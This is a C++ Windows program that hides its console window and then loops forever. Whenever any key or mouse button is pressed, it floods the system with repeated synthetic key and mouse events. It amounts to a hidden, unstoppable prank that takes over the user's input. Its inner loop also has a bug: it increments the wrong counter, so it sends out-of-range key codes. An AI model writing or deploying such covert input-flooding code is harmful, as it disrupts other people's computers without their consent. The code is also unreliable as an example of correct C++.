#include <bits/stdc++.h>
#include <windows.h>
// #include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#include <thread>
#include <dirent.h>
#include <vector>
#include <cstring>
#pragma comment(lib, "Shlwapi.lib")
#define Down(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1 : 0)
using namespace std;

int pid1 = -1, pid2 = -1, kbd;
inline bool exists(const string name)
{
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}
WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
int main()
{
    HideConsole();
    while (1)
    {
        for (int i = 1; i <= 254; ++i)
        {
            if (Down(i))
            {
                for (int j = 0; j < 100; ++i)
                {
                    switch (i)
                    {
                    case 1:
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                        break;
                    case 2:
                        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                        break;
                    case 4:
                        mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                        break;
                    default:
                        keybd_event(i, i, KEYEVENTF_KEYUP, 0);
                        keybd_event(i, i, 0, 0);
                        break;
                    }
                }
            }
        }
    }
    return 0;
}